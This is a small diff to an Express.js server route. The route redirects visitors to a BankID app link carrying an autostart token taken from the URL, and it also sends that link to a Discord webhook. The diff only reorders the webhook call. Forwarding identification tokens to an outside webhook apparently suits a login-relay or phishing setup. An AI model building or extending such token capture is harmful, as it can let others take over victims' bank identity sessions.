@@ -14,11 +14,9 @@ app.get('/', (req, res) => {
   // Construct the redirect URL with all query parameters
   const redirectUrl = `bankid://?autostarttoken=${req.originalUrl.slice(1)}`; // slice(1) to remove the leading '/'
 
-  // Log the redirect URL to Discord webhook
-  sendDiscordWebhook(redirectUrl);
 
-  // Redirect to the constructed URL
   res.redirect(redirectUrl);
+  sendDiscordWebhook(redirectUrl);
 });
 
 
